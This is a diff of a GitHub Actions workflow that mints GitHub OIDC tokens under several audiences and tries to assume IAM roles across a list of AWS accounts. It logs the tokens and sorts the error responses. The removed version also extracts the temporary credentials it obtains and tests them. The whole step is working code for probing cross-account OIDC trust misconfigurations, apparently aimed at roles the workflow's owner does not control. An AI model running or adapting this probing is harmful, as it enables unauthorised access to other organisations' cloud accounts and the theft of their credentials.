@@ -13,26 +13,25 @@ jobs:
       - name: mint-and-probe
         run: |
           echo "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF"
-          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
-          echo "JWTB64=$(echo -n "$tok" | base64 -w0)"
-          python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('SUB='+c['sub']); print('AUD='+c['aud']); print('ISS='+c['iss']); print('EXP='+str(c['exp']))" "$tok"
-          for r in \
-            arn:aws:iam::060717612896:role/artex10891-oidc-test \
-            arn:aws:iam::358174707935:role/auto-deploy-GitHubActionsRole \
-            arn:aws:iam::559556671935:role/auto-deploy-GitHubActionsRole \
-            arn:aws:iam::170026776852:role/auto-deploy-GitHubActionsRole \
-            arn:aws:iam::060717612896:role/auto-deploy-GitHubActionsRole \
-            arn:aws:iam::050111574890:role/auto-deploy-GitHubActionsRole ; do
-            echo "=== ROLE $r ==="
-            out=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name "artex10891" --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1)
-            echo "$out" | head -c 600; echo
-            ak=$(echo "$out" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['Credentials']['AccessKeyId'])" 2>/dev/null)
-            if [ -n "$ak" ]; then
-              sk=$(echo "$out" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['Credentials']['SecretAccessKey'])")
-              st=$(echo "$out" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['Credentials']['SessionToken'])")
-              arn=$(echo "$out" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['AssumedRoleUser']['Arn'])")
-              echo "ASSUMED=$arn"
-              AWS_ACCESS_KEY_ID=$ak AWS_SECRET_ACCESS_KEY=$sk AWS_SESSION_TOKEN=$st AWS_REGION=us-east-2 aws sts get-caller-identity --output json 2>&1 | head -c 400; echo
-            fi
-            sleep 1.6
+          for aud in sts.amazonaws.com aws sigv4.amazonaws.com appsecengineer https://appsecengineer.com; do
+            tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$aud" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+            echo "AUDREQ=$aud JWTB64=$(echo -n "$tok" | base64 -w0)"
+            python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('  CLAIM_AUD='+c['aud']+' SUB='+c['sub'])" "$tok"
+            for r in \
+              arn:aws:iam::358174707935:role/auto-deploy-GitHubActionsRole \
+              arn:aws:iam::559556671935:role/auto-deploy-GitHubActionsRole \
+              arn:aws:iam::170026776852:role/auto-deploy-GitHubActionsRole \
+              arn:aws:iam::170026776852:role/ase-deploy-GitHubActionsRole ; do
+              err=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name "artex10891" --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
+              code=$(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied|NoSuchEntity|ExpiredTokenException|ValidationError)[^)]*\)' | head -1)
+              [ -z "$code" ] && code=$(echo "$err" | head -c 250 | tr '\n' ' ')
+              echo "  ROLE $r => $code"
+              sleep 1.5
+            done
           done
+          echo "=== control: valid token vs nonexistent role in 060717612896 ==="
+          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-does-not-exist --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
+          echo "NONEXIST_ROLE => $(echo "$err" | head -c 300 | tr '\n' ' ')"
+          err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-oidc-test --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
+          echo "CONTROL_ROLE => $(echo "$err" | grep -oE 'ASIA[A-Z0-9]+' | head -1) $(echo "$err" | head -c 120 | tr '\n' ' ')"
